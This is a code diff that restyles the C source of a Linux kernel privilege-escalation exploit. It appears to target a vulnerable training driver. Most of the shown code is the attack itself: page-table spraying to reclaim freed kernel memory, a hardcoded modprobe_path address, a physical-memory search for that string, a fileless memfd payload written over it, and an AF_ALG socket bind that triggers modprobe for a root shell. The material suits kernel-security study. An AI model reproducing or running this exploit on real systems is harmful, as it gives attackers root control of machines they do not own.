@@ -107,18 +107,18 @@ int act(int act_fd, int code, int n, char *args)
 #define _pud_index_to_virt(i) (i << 30)
 #define _pgd_index_to_virt(i) (i << 39)
 #define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
-		((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + \
-		_pud_index_to_virt((unsigned long long)(pmd_index)) + \
-		_pmd_index_to_virt((unsigned long long)(pte_index)) + \
-		_pte_index_to_virt((unsigned long long)(page_index)) + \
-		(unsigned long long)(byte_index)))
+	((void *)(_pgd_index_to_virt((unsigned long long)(pud_index)) +      \
+		  _pud_index_to_virt((unsigned long long)(pmd_index)) +      \
+		  _pmd_index_to_virt((unsigned long long)(pte_index)) +      \
+		  _pte_index_to_virt((unsigned long long)(page_index)) +     \
+		  (unsigned long long)(byte_index)))
 
 int prepare_page_tables()
 {
 	/* prepare infra */
-	void *retv = mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
-					  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-	*(unsigned int*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
+	void *retv = mmap((void *)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x1000, PROT_WRITE,
+			  MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	*(unsigned int *)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xcafecafe;
 	if (retv == MAP_FAILED) {
 		perror("[-] mmap");
 		return EXIT_FAILURE;
@@ -127,7 +127,7 @@ int prepare_page_tables()
 	/* pre-register new tables and entries */
 	for (unsigned long long i = 0; i < 512; i++) {
 		retv = mmap((void *)PTI_TO_VIRT(1, 0, 1, i, 0), 0x1000, PROT_WRITE,
-					MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+			    MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	}
 	if (retv == MAP_FAILED) {
 		perror("[-] mmap");
@@ -142,27 +142,30 @@ int prepare_page_tables()
 #define MODPROBE_PATH_ADDR 0xffffffff835ccc60lu
 #define MODPROBE_PATH_ADDR_PART (MODPROBE_PATH_ADDR & 0xffff000lu)
 
-#define KMOD_PATH_LEN 256  /* default */
+#define KMOD_PATH_LEN 256 /* default */
 #define FLUSH_STAT_INPROGRESS 0
 #define FLUSH_STAT_DONE 1
-#define SLEEPLOCK(cmp) while (cmp) { usleep(10 * 1000); }
+#define SLEEPLOCK(cmp)             \
+	while (cmp) {              \
+		usleep(10 * 1000); \
+	}
 
 static long get_modprobe_path(char *buf, size_t buflen)
 {
 	int fd = open("/proc/sys/kernel/modprobe", O_RDONLY);
-    if (fd < 0) {
-        perror("[-] open");
-        return EXIT_FAILURE;
-    }
+	if (fd < 0) {
+		perror("[-] open");
+		return EXIT_FAILURE;
+	}
 
 	ssize_t bytes = read(fd, buf, buflen - 1);
-    close(fd);
-    
-    if (bytes < 0) {
-        perror("[-] read");
-        return EXIT_FAILURE;
-    }
-	buf[bytes-1] = '\x00'; /* cleanup line end */
+	close(fd);
+
+	if (bytes < 0) {
+		perror("[-] read");
+		return EXIT_FAILURE;
+	}
+	buf[bytes - 1] = '\x00'; /* cleanup line end */
 
 	printf("[+] current modprobe path: %s\n", buf);
 	return 0;
@@ -173,12 +176,10 @@ static void flush_tlb(void *addr, size_t len)
 {
 	short *status;
 
-	status = mmap(NULL, sizeof(short), PROT_WRITE,
-			      MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	status = mmap(NULL, sizeof(short), PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 
 	*status = FLUSH_STAT_INPROGRESS;
-	if (fork() == 0)
-	{
+	if (fork() == 0) {
 		munmap(addr, len);
 		*status = FLUSH_STAT_DONE;
 
@@ -204,12 +205,11 @@ static int strcmp_modprobe_path(char *new_str)
 }
 
 /* check whether address contains modprobe */
-void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
-						   char *modprobe_path_str, size_t modprobe_path_len)
+void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str,
+			   size_t modprobe_path_len)
 {
 	void *modprobe_addr;
-	modprobe_addr = memmem(haystack_virt, haystack_len,
-						   modprobe_path_str, modprobe_path_len);
+	modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
 
 	if (modprobe_addr == NULL)
 		return NULL;
@@ -230,26 +230,24 @@ void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len,
 /* fileless approach */
 char *prepare_payload(void)
 {
-	static char fake_modprobe[40] = {0};
+	static char fake_modprobe[40] = { 0 };
 	pid_t pid = getpid();
 
 	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
 	int shell_stdin_fd = dup(STDIN_FILENO);
 	int shell_stdout_fd = dup(STDOUT_FILENO);
 
-	if (dprintf(modprobe_script_fd, PAYLOAD, pid,
-		shell_stdin_fd, pid, shell_stdout_fd) == 0) {
-
+	if (dprintf(modprobe_script_fd, PAYLOAD, pid, shell_stdin_fd, pid, shell_stdout_fd) == 0) {
 		perror("[-] payload fd\n");
 		return NULL;
 	}
 
 	lseek(modprobe_script_fd, 0, SEEK_SET);
 
-	if (snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i",
-		pid, modprobe_script_fd) != 0)
+	if (snprintf(fake_modprobe, sizeof(fake_modprobe), "/proc/%i/fd/%i", pid,
+		     modprobe_script_fd) != 0)
 
-		printf("[+] payload written to: %s\n",fake_modprobe);
+		printf("[+] payload written to: %s\n", fake_modprobe);
 
 	return fake_modprobe;
 }
@@ -270,7 +268,7 @@ int modprobe_trigger_sock(void)
 
 	memset(&sa, 0, sizeof(sa));
 	sa.salg_family = AF_ALG;
-	strcpy((char *)sa.salg_type, "dummy");  /* dummy string */
+	strcpy((char *)sa.salg_type, "dummy"); /* dummy string */
 
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)); /* This should not return */
 
@@ -380,8 +378,8 @@ int main(void)
 	printf("[+] done, now go for page table\n");
 
 	printf("[!] create a page table to reclaim the freed memory\n");
-	for (unsigned long long i=0; i < ENTRIES_AMOUNT; i++) {
-		*(unsigned int*)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
+	for (unsigned long long i = 0; i < ENTRIES_AMOUNT; i++) {
+		*(unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0) = 0xcafecafe; /* create and fill PTE */
 	}
 	printf("[+] done, vulnerable page table has been created\n");
 
@@ -395,7 +393,7 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0),0x200000); /* 0x200000 = 4 KiB per 512 pages */
+	flush_tlb(PTI_TO_VIRT(1, 0, 1, 0, 0), 0x200000); /* 0x200000 = 4 KiB per 512 pages */
 
 	for (int i = 0; i < ENTRIES_AMOUNT; i++) {
 		unsigned int *ptr = (unsigned int *)PTI_TO_VIRT(1, 0, 1, i, 0);
@@ -403,15 +401,16 @@ int main(void)
 		unsigned int value = *ptr;
 
 		if (value != 0xcafecafe) {
-			modprobe_addr = memmem_modprobe_path(virt_address, PHYS_AREA,
-												 modprobe_path, modprobe_path_len);
+			modprobe_addr = memmem_modprobe_path(virt_address, PHYS_AREA, modprobe_path,
+							     modprobe_path_len);
 
 			if (modprobe_addr != NULL) {
-				printf("[+] success, userspace modprobe address %p\n", modprobe_addr);
+				printf("[+] success, userspace modprobe address %p\n",
+				       modprobe_addr);
 				printf("[!] dump an exploit fd and write its path as new modprobe path via the overwritten target object\n");
 
 				char *privesc = prepare_payload();
-				if (privesc  == NULL)
+				if (privesc == NULL)
 					goto end;
 				strcpy(modprobe_addr, privesc);
 
